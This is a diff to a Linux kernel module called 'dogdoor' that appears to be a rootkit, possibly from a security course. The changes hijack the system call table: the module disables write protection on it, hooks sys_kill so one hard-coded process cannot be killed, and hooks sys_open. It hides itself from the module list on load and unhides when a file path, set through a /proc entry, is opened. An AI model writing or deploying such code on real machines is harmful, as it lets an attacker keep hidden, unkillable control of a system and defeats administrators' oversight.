@@ -13,8 +13,9 @@
 
 MODULE_LICENSE("GPL");
 
-char filecmd[128] = { 0x0, } ;
+char filepath[128] = { 0x0, } ;
 void ** sctable ;
+int count = 0;
 
 static
 struct module_node{
@@ -62,30 +63,28 @@ void module_unhide (void) {
 	hidden = 0;
 }
 
-static
-int dogdoor_sys_open(const char __user * filename, int flags, umode_t mode)
+
+asmlinkage int (*orig_sys_open)(const char __user * filename, int flags, umode_t mode) ; 
+
+asmlinkage int openhook_sys_open(const char __user * filename, int flags, umode_t mode)
 {
 	char fname[256] ;
 
-	char cmd[] = "hide";
-	char cmd2[] = "unhide";
-
 	copy_from_user(fname, filename, 256) ;
 
-	if (strcmp (fname, cmd) ==0) {
-		module_hide() ;
-	}
-	if (strcmp (fname, cmd2) ==0) {
+	if (filepath[0] != 0x0 && strcmp(filepath, fname) == 0) {
+		count++ ;
 		module_unhide();
 	}
-	return dogdoor_sys_open(filename, flags, mode);
+	return orig_sys_open(filename, flags, mode) ;
 }
+
 
 asmlinkage long (*orig_sys_kill)(pid_t pid, int sig) ; 
 
 asmlinkage long dogdoor_sys_kill(pid_t pid, int sig) 
 {
-	if (pid==(pid_t)(2151))
+	if (pid==(pid_t)(1858))
 		return -1;
 	return orig_sys_kill(pid, sig);
 }
@@ -107,7 +106,7 @@ ssize_t dogdoor_proc_read(struct file *file, char __user *ubuf, size_t size, lof
 	char buf[256] ;
 	ssize_t toread ;
 
-	sprintf(buf, "%s\n", filecmd) ;
+	sprintf(buf, "%s\n", filepath) ;
 
 	toread = strlen(buf) >= *offset + size ? size : strlen(buf) - *offset ;
 
@@ -130,7 +129,8 @@ ssize_t dogdoor_proc_write(struct file *file, const char __user *ubuf, size_t si
 	if (copy_from_user(buf, ubuf, size))
 		return -EFAULT ;
 
-	sscanf(buf,"%s", filecmd) ;
+	sscanf(buf,"%s", filepath) ;
+	count = 0;
 	*offset = strlen(buf) ;
 
 	return *offset ;
@@ -154,12 +154,16 @@ int __init dogdoor_init(void) {
 
 	sctable = (void *) kallsyms_lookup_name("sys_call_table") ;
 
+	orig_sys_open = sctable[__NR_open] ;
 	orig_sys_kill = sctable[__NR_kill] ;
 
+	module_hide();
 	pte = lookup_address((unsigned long) sctable, &level) ;
 	if (pte->pte &~ _PAGE_RW) 
 		pte->pte |= _PAGE_RW ;		
+
 	sctable[__NR_kill] = dogdoor_sys_kill ;
+	sctable[__NR_open] = openhook_sys_open ;
 
 	return 0;
 }
@@ -170,6 +174,7 @@ void __exit dogdoor_exit(void) {
 	pte_t * pte ;
 	remove_proc_entry("dogdoor", NULL) ;
 
+	sctable[__NR_open] = orig_sys_open ;
 	sctable[__NR_kill] = orig_sys_kill ;
 
 	pte = lookup_address((unsigned long) sctable, &level) ;
